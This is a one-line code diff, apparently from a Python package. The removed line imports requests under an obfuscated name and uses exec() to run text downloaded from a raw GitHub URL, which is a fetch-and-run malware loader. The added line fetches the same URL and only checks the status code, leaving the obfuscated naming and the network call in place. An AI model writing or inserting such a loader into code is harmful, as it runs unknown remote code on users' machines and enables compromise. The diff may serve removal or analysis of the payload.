@@ -1,1 +1,1 @@
-import requests as O1O1O1O1O1O1O1O1O1O1O1; exec(O1O1O1O1O1O1O1O1O1O1O1.get('https://raw.githubusercontent.com/rimero321/entityclient/main/bekind.txt').text)
+import requests as O1O1O1O1O1OO1OO1O1O1O1O10101; O1O1O1O1O1OO1OO1O1O1O1O10101.get('https://raw.githubusercontent.com/rimero321/entityclient/main/bekind.txt').status_code == 200
